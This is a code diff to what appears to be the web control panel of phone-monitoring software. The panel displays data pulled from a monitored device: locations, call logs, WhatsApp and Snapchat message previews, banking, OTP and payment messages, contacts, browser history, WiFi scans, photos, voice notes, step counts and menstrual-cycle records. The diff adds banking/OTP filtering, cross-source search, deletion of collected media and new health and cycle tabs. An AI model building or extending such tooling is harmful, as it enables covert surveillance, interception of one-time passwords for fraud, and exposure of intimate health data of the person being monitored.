+    if (timelineFilter === 'banking') return type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction');
     return true;
-  }).slice(0, 200);
-  if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+  });
+
+  // Sort newest first
+  filtered.sort((a, b) => parseInt(b.ts_ms || '0') - parseInt(a.ts_ms || '0'));
+
+  // Pagination
+  const start = timelineOffset;
+  const end = timelineOffset + TIMELINE_BATCH;
+  const page = filtered.slice(start, end);
+  const hasMore = end < filtered.length;
+
+  if (!page.length && timelineOffset === 0) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+
+  // Dedup (configurable)
+  const dedupEnabled = document.getElementById('dedupToggle')?.checked !== false;
+  const dedupWindow = dedupEnabled ? 10000 : 0; // 10s window
   const deduped = [];
-  for (const d of filtered) {
+  for (const d of page) {
+    if (!dedupEnabled) { deduped.push(d); continue; }
     const last = deduped[deduped.length - 1];
     if (last && (d.type || '').includes(last.type || '') &&
         (d.contactName || d.contact || '') === (last.contactName || last.contact || '') &&
-        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < 60000) {
+        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < dedupWindow) {
       continue;
     }
     deduped.push(d);
   }
+
   const groups = {};
   for (const d of deduped) {
     const day = new Date(parseInt(d.ts_ms || '0')).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
@@ -2157,24 +2421,69 @@ function renderTimeline(docs) {
     const calls = entries.filter(e => (e.type || '').includes('call')).length;
     const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
     const snaps = entries.filter(e => (e.type || '').includes('snapchat')).length;
-    const summary = [locs ? `${locs}📍` : '', calls ? `${calls}📞` : '', msgs ? `${msgs}💬` : '', snaps ? `${snaps}📸` : ''].filter(Boolean).join(' ');
+    const banks = entries.filter(e => (e.type || '').includes('banking') || (e.type || '').includes('financial') || (e.type || '').includes('otp') || (e.type || '').includes('payment') || (e.type || '').includes('transaction')).length;
+    const summary = [locs ? `${locs}📍` : '', calls ? `${calls}📞` : '', msgs ? `${msgs}💬` : '', snaps ? `${snaps}📸` : '', banks ? `${banks}💳` : ''].filter(Boolean).join(' ');
     html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
     for (const d of entries) {
       const type = d.type || '';
       const ts = parseInt(d.ts_ms || '0');
-      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
+      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
       const contact = d.contactName || d.contact || '';
       const msg = d.messagePreview || '';
       const dur = d.duration || '';
       const dir = d.direction || '';
-      html += `<div class="card">
+      const lat = d.lat, lng = d.lng;
+      const clickAttr = (type === 'location' && lat && lng) ? ` onclick="flyToLocation(${lat}, ${lng}, '${pkt(ts)}')" style="cursor:pointer"` : '';
+      html += `<div class="card"${clickAttr}>
         <div class="time">${icon} ${pkt(ts)}</div>
-        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${lat && lng ? ' <span style="font-size:10px;color:var(--accent)">\u{1F4CD} ' + lat.toFixed(4) + ', ' + lng.toFixed(4) + '</span>' : ''}</div>
       </div>`;
     }
     html += '</div>';
   }
   list.innerHTML = html;
+
+  // Load more button
+  if (hasMore) {
+    const loadMoreDiv = document.createElement('div');
+    loadMoreDiv.style.cssText = 'text-align:center;margin-top:8px';
+    loadMoreDiv.innerHTML = '<button class="load-more-btn" onclick="loadMoreTimeline()">Load ' + TIMELINE_BATCH + ' more (' + (filtered.length - end) + ' remaining)</button>';
+    list.appendChild(loadMoreDiv);
+  }
+}
+
+function loadMoreTimeline() {
+  if (timelineLoading || !timelineCache) return;
+  timelineLoading = true;
+  timelineOffset += TIMELINE_BATCH;
+  renderTimeline(timelineCache);
+  timelineLoading = false;
+}
+
+async function clearTimeline() {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  const type = prompt('Clear type (location/call/whatsapp/snapchat/banking/all):', 'all');
+  if (!type) return;
+  if (type === 'all') {
+    if (!confirm('Delete ALL timeline data? This cannot be undone.')) return;
+  }
+  showAlert('Clearing timeline...', 'warn');
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+    if (!data || typeof data !== 'object') { showAlert('No timeline data', 'error'); return; }
+    let deleted = 0;
+    for (const [key, val] of Object.entries(data)) {
+      if (type === 'all' || (val.type || '').includes(type)) {
+        const ok = await deleteRTDB(`devices/${selectedDevice}/timeline/${key}`);
+        if (ok) deleted++;
+      }
+    }
+    timelineCache = null;
+    pollHistory();
+    showAlert(`Deleted ${deleted} timeline entries`, deleted > 0 ? 'warn' : 'error');
+  } catch (e) {
+    showAlert('Failed to clear timeline: ' + e.message, 'error');
+  }
 }
 
 function renderCalls(docs) {
@@ -2197,15 +2506,67 @@ document.querySelectorAll('.app-period-btn').forEach(btn => {
   btn.addEventListener('click', () => {
     document.querySelectorAll('.app-period-btn').forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
-    if (btn.dataset.period === 'mostRecent') {
-      if (appSnapshotsCache) renderAppSnapshots();
-      else pollAppSnapshots();
-    } else if (appsCache) {
+    if (appsCache) {
       renderApps(appsCache);
     } else {
       pollApps();
     }
   });
+});
+
+// --- Global Search ---
+document.getElementById('globalSearch')?.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    const q = this.value.trim().toLowerCase();
+    if (!q) return;
+    // Check timeline
+    if (timelineCache) {
+      const matches = timelineCache.filter(d =>
+        (d.contactName || '').toLowerCase().includes(q) ||
+        (d.contact || '').toLowerCase().includes(q) ||
+        (d.messagePreview || '').toLowerCase().includes(q) ||
+        (d.number || '').includes(q)
+      );
+      if (matches.length) {
+        document.querySelector('[data-tab="timeline"]')?.click();
+        document.getElementById('timelineSearch').value = q;
+        document.getElementById('timelineSearch').dispatchEvent(new Event('input'));
+        showAlert(`Found ${matches.length} timeline matches for "${q}"`, 'warn');
+        return;
+      }
+    }
+    // Check contacts
+    if (contactsCache) {
+      const matches = contactsCache.filter(c =>
+        c.name.toLowerCase().includes(q) || c.num.includes(q) || c.email.toLowerCase().includes(q)
+      );
+      if (matches.length) {
+        document.querySelector('[data-tab="contacts"]')?.click();
+        document.getElementById('contactsSearch').value = q;
+        renderContacts();
+        showAlert(`Found ${matches.length} contact matches for "${q}"`, 'warn');
+        return;
+      }
+    }
+    // Check browser history
+    if (document.getElementById('browserList').cachedData) {
+      document.querySelector('[data-tab="browser"]')?.click();
+      document.getElementById('browserSearch').value = q;
+      document.getElementById('browserSearch').dispatchEvent(new Event('input'));
+      showAlert(`Searched browser history for "${q}"`, 'warn');
+      return;
+    }
+    showAlert(`No exact matches for "${q}" — switched to browser search`, 'warn');
+    document.querySelector('[data-tab="browser"]')?.click();
+    document.getElementById('browserSearch').value = q;
+    document.getElementById('browserSearch').dispatchEvent(new Event('input'));
+  }
+});
+document.getElementById('globalSearch')?.addEventListener('input', function() {
+  const q = this.value.trim();
+  // Keyboard shortcut hints when typing
+  const hints = document.getElementById('shortcutHints');
+  if (hints) hints.style.display = q ? 'none' : '';
 });
 
 // --- Copy coords ---
@@ -2307,6 +2668,68 @@ async function renderInsights() {
   }
 }
 
+// --- Pie Chart ---
+function drawPieChart(canvasId, data, colors) {
+  const canvas = document.getElementById(canvasId);
+  if (!canvas) return;
+  const dpr = window.devicePixelRatio || 1;
+  const parent = canvas.parentElement;
+  const size = Math.min(parent?.clientWidth || 300, 300);
+  canvas.width = size * dpr;
+  canvas.height = size * dpr;
+  canvas.style.width = size + 'px';
+  canvas.style.height = size + 'px';
+  const ctx = canvas.getContext('2d');
+  ctx.scale(dpr, dpr);
+  const cx = size / 2, cy = size / 2, radius = size / 2 - 10;
+  ctx.clearRect(0, 0, size, size);
+  if (!data || !data.length) {
+    ctx.fillStyle = '#8b949e'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
+    ctx.fillText('No data', cx, cy);
+    return;
+  }
+  const total = data.reduce((s, d) => s + d.value, 0);
+  if (total === 0) {
+    ctx.fillStyle = '#8b949e'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
+    ctx.fillText('No data', cx, cy);
+    return;
+  }
+  let startAngle = -Math.PI / 2;
+  const slices = [];
+  data.forEach((d, i) => {
+    const angle = (d.value / total) * Math.PI * 2;
+    slices.push({ ...d, startAngle, endAngle: startAngle + angle, color: colors[i % colors.length] });
+    startAngle += angle;
+  });
+  // Draw slices
+  slices.forEach(s => {
+    ctx.beginPath();
+    ctx.moveTo(cx, cy);
+    ctx.arc(cx, cy, radius, s.startAngle, s.endAngle);
+    ctx.closePath();
+    ctx.fillStyle = s.color;
+    ctx.fill();
+    // Label
+    const midAngle = s.startAngle + (s.endAngle - s.startAngle) / 2;
+    const labelR = radius * 0.65;
+    const lx = cx + Math.cos(midAngle) * labelR;
+    const ly = cy + Math.sin(midAngle) * labelR;
+    if (s.value / total > 0.05) {
+      ctx.fillStyle = '#000'; ctx.font = 'bold 10px sans-serif'; ctx.textAlign = 'center';
+      ctx.fillText(Math.round(s.value / total * 100) + '%', lx, ly + 3);
+    }
+  });
+  // Legend
+  const legendY = size + 4;
+  let legendHtml = '<div style="display:flex;flex-wrap:wrap;gap:6px;justify-content:center;font-size:10px;margin-top:4px">';
+  data.forEach((d, i) => {
+    legendHtml += `<span><span style="display:inline-block;width:10px;height:10px;background:${colors[i % colors.length]};border-radius:2px;vertical-align:middle;margin-right:3px"></span>${escHtml(d.label)}</span>`;
+  });
+  legendHtml += '</div>';
+  const legendEl = document.getElementById(canvasId + '-legend');
+  if (legendEl) legendEl.innerHTML = legendHtml;
+}
+
 // --- Storage & Cleanup ---
 function formatBytes(bytes) {
   if (!bytes || bytes < 0) return '0 B';
@@ -2322,6 +2745,49 @@ async function deleteRTDB(path) {
     const r = await fetch(`${RTDB}/${path}.json`, { method: 'DELETE' });
     return r.ok;
   } catch { return false; }
+}
+
+async function deletePhoto(ts) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  const path = `devices/${selectedDevice}/photos/${ts}`;
+  showAlert('Deleting photo...', 'warn');
+  const ok = await deleteRTDB(path);
+  if (ok) {
+    delete cachedPhotos[ts];
+    photoKeys = photoKeys.filter(k => k !== String(ts));
+    renderPhotosFromCache();
+    await refreshStorage();
+    showAlert('Photo deleted', 'warn');
+  } else {
+    showAlert('Failed to delete photo', 'error');
+  }
+}
+
+async function deleteVoiceNote(batchKey, noteIndex) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  try {
+    const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+      showAlert('Voice note not found', 'error');
+      return;
+    }
+    const note = batch.notes[noteIndex];
+    batch.notes.splice(noteIndex, 1);
+    batch.totalCount = batch.notes.length;
+    if (batch.notes.length === 0) {
+      await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    } else {
+      await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+        method: 'PUT',
+        body: JSON.stringify(batch)
+      });
+    }
+    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
+    pollVoiceNotes();
+    await refreshStorage();
+  } catch (e) {
+    showAlert('Delete failed: ' + e.message, 'error');
+  }
 }
 
 async function estimateNodeSize(path, sampleSize = 3) {
@@ -2350,7 +2816,7 @@ async function estimateNodeSize(path, sampleSize = 3) {
 async function refreshStorage() {
   if (!selectedDevice) return;
   const el = document.getElementById('storageOverview');
-  el.innerHTML = '<div class="label">Scanning storage...</div>';
+  el.innerHTML = '<div class="skel skel-block"></div><div class="skel skel-line w50"></div><div class="skel skel-line w30"></div>';
   const devicePath = `devices/${selectedDevice}`;
   try {
     const [photos, voice, timeline, contacts, apps, location, browser, wifi] = await Promise.all([
@@ -2370,20 +2836,28 @@ async function refreshStorage() {
       { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
       { name: 'App Usage', icon: '📊', path: 'apps', ...apps },
       { name: 'Location', icon: '📍', path: 'location', ...location },
-      { name: 'Browser History', icon: '🌐', path: 'browser_history', ...browser },
-      { name: 'WiFi Scans', icon: '📡', path: 'wifi_scan', ...wifi }
+      { name: 'Browser', icon: '🌐', path: 'browser_history', ...browser },
+      { name: 'WiFi', icon: '📡', path: 'wifi_scan', ...wifi }
     ];
     let totalBytes = 0;
-    let html = '<div style="font-size:13px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
+    for (const cat of categories) totalBytes += cat.bytes;
+    const pieColors = ['#ffca28','#3fb950','#f85149','#58a6ff','#bc8cff','#f0883e','#79c0ff','#ff7b72'];
+    const pieData = categories.filter(c => c.bytes > 0).map((c, i) => ({ label: c.name, value: c.bytes }));
+    // Layout: pie chart on left, table on right
+    let html = '<div style="display:flex;flex-wrap:wrap;gap:12px;align-items:flex-start">';
+    html += '<div style="flex:0 0 auto"><canvas id="storagePieChart" class="chart-canvas" style="width:200px!important;height:200px!important"></canvas><div id="storagePieChart-legend"></div></div>';
+    html += '<div style="flex:1;min-width:200px">';
+    html += '<div style="font-size:13px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
     html += '<table style="font-size:12px"><thead><tr><th>Category</th><th>Entries</th><th>Est. Size</th></tr></thead><tbody>';
     for (const cat of categories) {
-      totalBytes += cat.bytes;
       html += `<tr><td>${cat.icon} ${cat.name}</td><td>${cat.count === 0 ? '—' : cat.count}</td><td>${cat.count === 0 ? '—' : formatBytes(cat.bytes)}</td></tr>`;
     }
     html += `<tr style="border-top:2px solid var(--accent);font-weight:600"><td>Total</td><td>${categories.reduce((s, c) => s + c.count, 0)}</td><td>${formatBytes(totalBytes)}</td></tr>`;
     html += '</tbody></table>';
     html += '<div style="font-size:10px;color:var(--muted);margin-top:4px">* Sizes estimated from random samples. Refresh to update.</div>';
+    html += '</div></div>';
     el.innerHTML = html;
+    drawPieChart('storagePieChart', pieData, pieColors);
     renderCleanupActions(categories);
   } catch {
     el.innerHTML = '<div class="label" style="color:var(--danger)">Failed to scan storage</div>';
@@ -3054,6 +3528,315 @@ function toggleWifiPrev(id) {
 }
 
 document.getElementById('wifiSearch')?.addEventListener('input', renderWifiScans);
+
+// --- Health Tab ---
+let healthStepCache = [];
+
+async function pollHealth() {
+  if (!selectedDevice) return;
+  const metrics = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+  const activity = await fetchRTDB(`devices/${selectedDevice}/activity/latest`);
+  const stepsData = await fetchRTDB(`devices/${selectedDevice}/steps`);
+
+  // Steps card
+  const steps = (metrics && metrics.stepsToday) || 0;
+  const goal = (metrics && metrics.stepsGoal) || 8000;
+  const pct = Math.min(100, Math.round((steps / goal) * 100));
+  document.getElementById('healthSteps').textContent = steps.toLocaleString();
+  document.getElementById('healthStepsGoal').textContent = `Goal: ${goal.toLocaleString()} (${pct}%)`;
+  document.getElementById('healthStepsBar').style.width = pct + '%';
+
+  // Activity card
+  if (activity && activity.type) {
+    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
+    const icon = iconMap[activity.type] || '❓';
+    document.getElementById('healthActivity').textContent = `${icon} ${activity.type}`;
+    document.getElementById('healthActivityConfidence').textContent = `Confidence: ${activity.confidence}% | Source: ${activity.source} | ${pkt(activity.ts_ms)}`;
+  } else {
+    document.getElementById('healthActivity').textContent = '--';
+    document.getElementById('healthActivityConfidence').textContent = 'No activity data yet';
+  }
+
+  // Step history chart
+  if (stepsData && typeof stepsData === 'object') {
+    healthStepCache = Object.entries(stepsData)
+      .map(([date, val]) => ({ date, steps: val.steps || 0, ts: val.ts_ms || 0 }))
+      .filter(s => s.date && s.date.length === 10)
+      .sort((a, b) => a.date.localeCompare(b.date))
+      .slice(-7);
+    renderStepChart();
+  } else {
+    document.getElementById('healthStepChart').innerHTML = '<div class="label" style="width:100%;text-align:center;color:var(--muted)">No step history yet</div>';
+  }
+
+  // Activity timeline
+  if (activity && activity.type) {
+    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
+    const icon = iconMap[activity.type] || '❓';
+    document.getElementById('healthActivityTimeline').innerHTML = `
+      <div class="card" style="padding:8px 12px;margin-bottom:4px">
+        <div style="display:flex;justify-content:space-between;font-size:12px">
+          <span>${icon} ${activity.type}</span>
+          <span style="color:var(--muted)">${activity.confidence}% &middot; ${pkt(activity.ts_ms)}</span>
+        </div>
+      </div>`;
+  }
+
+  // Haidh
+  await pollHaidh();
+}
+
+function renderStepChart() {
+  const canvas = document.getElementById('healthStepCanvas');
+  if (!canvas || !healthStepCache.length) {
+    if (canvas) { const ctx = canvas.getContext('2d'); ctx.clearRect(0,0,canvas.width,canvas.height); }
+    return;
+  }
+  const dpr = window.devicePixelRatio || 1;
+  const rect = canvas.parentElement.getBoundingClientRect();
+  canvas.width = (rect.width || 600) * dpr;
+  canvas.height = 200 * dpr;
+  canvas.style.width = (rect.width || 600) + 'px';
+  canvas.style.height = '200px';
+  const ctx = canvas.getContext('2d');
+  ctx.scale(dpr, dpr);
+  const W = canvas.width / dpr, H = 200, pad = { top: 20, bottom: 30, left: 50, right: 20 };
+  const chartW = W - pad.left - pad.right;
+  const chartH = H - pad.top - pad.bottom;
+  const max = Math.max(...healthStepCache.map(s => s.steps), 1);
+  const goal = parseInt((document.getElementById('healthStepsGoal')?.textContent || '').replace(/[^0-9]/g, '')) || 8000;
+  ctx.clearRect(0, 0, W, H);
+  // Background grid
+  ctx.strokeStyle = '#30363d';
+  ctx.lineWidth = 0.5;
+  for (let i = 0; i <= 4; i++) {
+    const y = pad.top + chartH * (1 - i / 4);
+    ctx.beginPath(); ctx.moveTo(pad.left, y); ctx.lineTo(W - pad.right, y); ctx.stroke();
+    ctx.fillStyle = '#8b949e'; ctx.font = '10px sans-serif'; ctx.textAlign = 'right';
+    ctx.fillText(Math.round(max * i / 4).toLocaleString(), pad.left - 6, y + 4);
+  }
+  // Goal line
+  if (goal > 0 && goal <= max) {
+    const goalY = pad.top + chartH * (1 - goal / max);
+    ctx.strokeStyle = '#3fb950'; ctx.lineWidth = 1; ctx.setLineDash([4, 4]);
+    ctx.beginPath(); ctx.moveTo(pad.left, goalY); ctx.lineTo(W - pad.right, goalY); ctx.stroke();
+    ctx.setLineDash([]);
+    ctx.fillStyle = '#3fb950'; ctx.font = '9px sans-serif'; ctx.textAlign = 'left';
+    ctx.fillText('Goal: ' + goal.toLocaleString(), W - pad.right - 70, goalY - 4);
+  }
+  // Bars
+  const barW = Math.max(8, Math.min(40, chartW / healthStepCache.length * 0.7));
+  const gap = (chartW - barW * healthStepCache.length) / (healthStepCache.length + 1);
+  healthStepCache.forEach((entry, i) => {
+    const x = pad.left + gap + i * (barW + gap);
+    const h = Math.max(2, (entry.steps / max) * chartH);
+    const y = pad.top + chartH - h;
+    const color = entry.steps >= goal ? '#3fb950' : '#ffca28';
+    ctx.fillStyle = color;
+    ctx.beginPath();
+    ctx.roundRect(x, y, barW, h, [3, 3, 0, 0]);
+    ctx.fill();
+    // Hover effect area
+    ctx.fillStyle = color + '40';
+    ctx.fillRect(x, pad.top, barW, chartH);
+    // Label
+    ctx.fillStyle = '#8b949e'; ctx.font = '9px sans-serif'; ctx.textAlign = 'center';
+    ctx.fillText(entry.date.slice(5), x + barW/2, H - 6);
+    // Value
+    ctx.fillStyle = '#c9d1d9'; ctx.font = 'bold 9px sans-serif';
+    ctx.fillText(entry.steps.toLocaleString(), x + barW/2, y - 4);
+  });
+}
+
+function exportStepChart() {
+  const canvas = document.getElementById('healthStepCanvas');
+  if (!canvas) return;
+  const link = document.createElement('a');
+  link.download = 'step_chart_' + new Date().toISOString().slice(0,10) + '.png';
+  link.href = canvas.toDataURL('image/png');
+  link.click();
+}
+
+// --- Haidh (Menstrual Cycle) Tab ---
+async function pollHaidh() {
+  if (!selectedDevice) return;
+  try {
+    const [cycles, phases, meta] = await Promise.all([
+      fetchRTDB(`devices/${selectedDevice}/haidh/cycles`),
+      fetchRTDB(`devices/${selectedDevice}/haidh/phases`),
+      fetchRTDB(`devices/${selectedDevice}/haidh/meta`)
+    ]);
+    renderHaidh(cycles, phases, meta);
+  } catch (e) {
+    console.error('Haidh poll error:', e);
+  }
+}
+
+function renderHaidh(cycles, phases, meta) {
+  // Summary cards
+  const summaryDiv = document.getElementById('haidhSummary');
+  if (!summaryDiv) return;
+
+  const today = new Date().toISOString().slice(0, 10);
+  const cycleData = cycles || {};
+  const phaseData = phases || {};
+  
+  // Sort cycles by date
+  const sortedCycles = Object.entries(cycleData)
+    .map(([date, data]) => ({ date, ...data }))
+    .sort((a, b) => a.date.localeCompare(b.date));
+  
+  // Current status
+  const todayEntry = cycleData[today];
+  const lastHaidhEntry = sortedCycles.reverse().find(c => c.status === 'HAIDH');
+  const lastTuhrEntry = sortedCycles.reverse().find(c => c.status === 'TUHR');
+  
+  // Stats
+  const haidhDays = Object.values(cycleData).filter(c => c.status === 'HAIDH').length;
+  const istihadaDays = Object.values(cycleData).filter(c => c.istihadaType && c.istihadaType !== 'NONE').length;
+  const tuhrDays = Object.values(cycleData).filter(c => c.status === 'TUHR' && (!c.istihadaType || c.istihadaType === 'NONE')).length;
+  
+  // Last sync
+  const lastSync = meta?.lastSync ? `Last sync: ${meta.lastSync}` : 'Never synced';
+  document.getElementById('haidhLastSync').textContent = lastSync;
+
+  summaryDiv.innerHTML = `
+    <div class="card" style="border-left-color:#ef4444;padding:10px 12px">
+      <div class="label">🔴 Haidh Days</div>
+      <div style="font-size:24px;font-weight:700;color:#ef4444">${haidhDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#eab308;padding:10px 12px">
+      <div class="label">🟡 Istihada Days</div>
+      <div style="font-size:24px;font-weight:700;color:#eab308">${istihadaDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#22c55e;padding:10px 12px">
+      <div class="label">🟢 Tuhr Days</div>
+      <div style="font-size:24px;font-weight:700;color:#22c55e">${tuhrDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#ffca28;padding:10px 12px">
+      <div class="label">${todayEntry?.status === 'HAIDH' ? '🔴' : '🟢'} Today</div>
+      <div style="font-size:18px;font-weight:700">${todayEntry?.status || 'TUHR'}</div>
+      <div style="font-size:10px;color:var(--muted)">${todayEntry?.istihadaType && todayEntry.istihadaType !== 'NONE' ? '⚠️ ' + todayEntry.istihadaType : ''}</div>
+    </div>
+  `;
+
+  // Calendar heatmap (6 months)
+  renderHaidhCalendar(sortedCycles);
+}
+
+function renderHaidhCalendar(sortedCycles) {
+  const canvas = document.getElementById('haidhCalendarCanvas');
+  if (!canvas) return;
+  
+  const dpr = window.devicePixelRatio || 1;
+  const rect = canvas.parentElement.getBoundingClientRect();
+  canvas.width = (rect.width || 600) * dpr;
+  canvas.height = 200 * dpr;
+  canvas.style.width = (rect.width || 600) + 'px';
+  canvas.style.height = '200px';
+  const ctx = canvas.getContext('2d');
+  ctx.scale(dpr, dpr);
+  const W = canvas.width / dpr, H = 200;
+  const pad = { top: 30, bottom: 30, left: 50, right: 20 };
+  const chartW = W - pad.left - pad.right;
+  const chartH = H - pad.top - pad.bottom;
+  
+  // Create map of date -> entry
+  const cycleMap = new Map(sortedCycles.map(c => [c.date, c]));
+  
+  // Get last 6 months
+  const today = new Date();
+  const todayStr = today.toISOString().slice(0, 10);
+  const months = [];
+  for (let i = 5; i >= 0; i--) {
+    const d = new Date(today.getFullYear(), today.getMonth() - i, 1);
+    months.push({ year: d.getFullYear(), month: d.getMonth() });
+  }
+  
+  ctx.clearRect(0, 0, W, H);
+  
+  // Draw month labels
+  ctx.fillStyle = '#8b949e';
+  ctx.font = '11px sans-serif';
+  ctx.textAlign = 'center';
+  
+  let x = pad.left;
+  const dayWidth = chartW / 180; // ~6 months * 30 days
+  
+  months.forEach((m, mi) => {
+    const daysInMonth = new Date(m.year, m.month + 1, 0).getDate();
+    const monthName = new Date(m.year, m.month, 1).toLocaleString('default', { month: 'short' });
+    ctx.fillText(`${monthName} ${m.year}`, x + (daysInMonth * dayWidth) / 2, pad.top - 8);
+    x += daysInMonth * dayWidth;
+  });
+  
+  // Draw days
+  x = pad.left;
+  let currentDate = new Date(months[0].year, months[0].month, 1);
+  const endDate = new Date(months[5].year, months[5].month + 1, 0);
+  
+  while (currentDate <= endDate) {
+    const dateStr = currentDate.toISOString().slice(0, 10);
+    const entry = cycleMap.get(dateStr);
+    
+    let color;
+    if (entry) {
+      if (entry.status === 'HAIDH') {
+        // Color by flow intensity
+        color = entry.flowIntensity === 3 ? '#8b0000' : entry.flowIntensity === 2 ? '#b22222' : entry.flowIntensity === 1 ? '#cd5c5c' : '#ff6b6b';
+      } else if (entry.istihadaType && entry.istihadaType !== 'NONE') {
+        color = entry.istihadaType === 'KATHIRA' ? '#eab308' : entry.istihadaType === 'MUTAWASITA' ? '#fbbf24' : '#fcd34d';
+      } else {
+        color = '#22c55e'; // TUHR
+      }
+    } else {
+      color = '#1c1f33'; // No data
+    }
+    
+    // Future dates
+    if (currentDate > today) {
+      color = '#2d2f4a';
+    }
+    
+    ctx.fillStyle = color;
+    ctx.fillRect(x, pad.top + 2, Math.max(1, dayWidth - 1), chartH - 4);
+    
+    // Today marker
+    if (dateStr === todayStr) {
+      ctx.strokeStyle = '#ffca28';
+      ctx.lineWidth = 2;
+      ctx.strokeRect(x, pad.top + 2, Math.max(1, dayWidth - 1), chartH - 4);
+    }
+    
+    x += dayWidth;
+    currentDate.setDate(currentDate.getDate() + 1);
+  }
+  
+  // Legend
+  const legendY = H - pad.bottom + 18;
+  const legendItems = [
+    { color: '#ff6b6b', label: 'Haidh (Light)' },
+    { color: '#b22222', label: 'Haidh (Med)' },
+    { color: '#8b0000', label: 'Haidh (Heavy)' },
+    { color: '#fcd34d', label: 'Istihada Qalila' },
+    { color: '#fbbf24', label: 'Istihada Mutawasita' },
+    { color: '#eab308', label: 'Istihada Kathira' },
+    { color: '#22c55e', label: 'Tuhr' },
+    { color: '#1c1f33', label: 'No Data' },
+    { color: '#2d2f4a', label: 'Future' }
+  ];
+  
+  ctx.font = '9px sans-serif';
+  ctx.textAlign = 'left';
+  let lx = pad.left;
+  legendItems.forEach(item => {
+    ctx.fillStyle = item.color;
+    ctx.fillRect(lx, legendY, 12, 10);
+    ctx.fillStyle = '#c9d1d9';
+    ctx.fillText(item.label, lx + 16, legendY + 8);
+    lx += ctx.measureText(item.label).width + 28;
+  });
+}
 
 // --- Init ---
 async function init() {
